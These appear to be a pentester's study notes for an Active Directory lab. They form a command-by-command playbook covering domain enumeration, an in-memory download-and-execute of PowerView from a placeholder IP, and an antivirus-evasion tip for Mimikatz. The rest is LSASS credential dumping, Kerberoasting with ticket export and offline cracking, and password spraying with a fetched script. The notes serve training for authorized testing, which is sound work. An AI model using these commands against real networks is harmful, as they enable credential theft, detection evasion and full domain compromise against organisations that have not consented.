Simple Enumeration Approach
               - enumerate all local accounts 
                    - net user
               - enumerate all users in the entire domain
                    - net user /domain
               - query a specific user
                    - net user jeff_admin /domain
               - enumerate all groups in the domain
                    - net group /domain
               - Enumerate domain account policy (important for slow password attacks)
                    - net accounts
                    
Currently Logged on Users
          - Import-Module .\PowerView.ps1
          - PS C:\Tools\active_directory> Get-NetLoggedon -ComputerName client251
          - PS C:\Tools\active_directory> Get-NetSession -ComputerName dc01
          - Alt method: Execute from memory
            - Serve PowerView.psq on your machine 
            - iex (New-Object System.Net.Webclient).DownloadString('http://<IP>/PowerView.ps1')
            - Get-NetSession -ComputerName dc01
            

             
Enumeration using Scripts (needed for Nested Groups):
  - Use Scripts to find Groups, nested groups and their members.
  - For getting SPNs, if your script is not working, Refer to your lab report or get scripts from the internet. 
  
------------------------------------------------------------------------------------------------


   $domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

   $PDC = ($domainObj.PdcRoleOwner).Name

   $SearchString = "LDAP://"

   $SearchString += $PDC + "/"

   $DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"

   $SearchString += $DistinguishedName

   $Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)

   $objDomain = New-Object System.DirectoryServices.DirectoryEntry

   $Searcher.SearchRoot = $objDomain

   $Searcher.filter="(objectClass=Group)"
    <# - You can edit the above line to list memebers of a specific group:
          - $Searcher.filter="memberof=CN=<group name>,CN=Users,DC=corp,DC=com"
          - Example: $Searcher.filter="objectcategory=CN=Computer,CN=Schema,CN=Configuration,DC=corp,DC=com"
          - Another example: $Searcher.filter="operatingsystem=Windows 10 Pro"
          - Another example: $Searcher.filter="(name=Nested_Group)"
          - Find a specific IIS SPN:  $Searcher.filter = "serviceprincipalname=*http*"
          - Find all SPN:  $Searcher.filter = "samaccountname=*service*"
          - for IP address of any servers where a service principal name is registered go to page 157 in your lab report.
       
    #>
   $Result = $Searcher.FindAll()
       
   Foreach($obj in $Result)
   {
       Foreach($prop in $obj.Properties)
       {
           $prop
       }

       Write-Host "------------------------"
   }
   
------------------------------------------------------------------------------------------------

Cached Credential Storage and Retrieval 

  Note: Mimikatz might get blocked by AV. Try using an injector like powershell or dump the entire LSASS process memory, move the data
  to a helper machine, and then load the data into Mimikatz.
  
  Use Mimikatz to dump all password hashes:
  - mimikatz.exe
  - privilege::debug
  - sekurlsa::logonpasswords
  
 Service Account Attacks
 
 We know an SPN: HTTP/CorpWebServer.corp.com
 - Add-Type -AssemblyName System.IdentityModel
 - New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'HTTP/CorpWebServer.corp.com'
      - After execution, the requested service ticket should be generated by the domain controller and loaded into the memory of the Windows 10 client. 
 - Instead of executing Mimikatz all the time, we can also use the built-in klist command to display all cached Kerberos tickets for the current user
      - PS C:\Users\offsec.CORP> klist
 - Export ticket: mimikatz # kerberos::list /export
 - Perform wordlist attack on your kali machine:
   - kerberoast
     - sudo apt update && sudo apt install kerberoast
     - python /usr/share/kerberoast/tgsrepcrack.py wordlist.txt 1-40a50000-Offsec@HTTP~CorpWebServer.corp.com-CORP.COM.kirbi
   - John 
     - Convert the kirbi file: sudo python3 kirbi2john.py.1 1-40a10000-offsec@MSSQLSvc~CorpSqlServer.corp.com~1433-CORP.COM.kirbi > hash.txt
     - john --wordlist=wordlist.txt hash.txt
   - Invoke-Kerberoast.ps1 
     - import-module .\Invoke-Kerberoast.ps1
     - Invoke-Kerberoast | % { $_.Hash } | % { $_.replace('krb5tgs$', 'krb5tgs$23$*') } | % { $_ -replace "(.*):(.*)", '$1*$$$2' } | % {$_.replace(':','~') } | Out-file - FilePath .\hashes.txt -Encoding utf8
     - Take hashes.txt to your machine.
     - john --wordlist=wordlist.txt hashes.txt
     
 Password Guessing:
  
  - Download this: https://raw.githubusercontent.com/tobor88/PayloadSiteForPenTesters/master/Spray-Passwords.ps1
  - .\Spray-Password.ps1 -File .\password.txt -Admins -Verbose
  
  
  
  

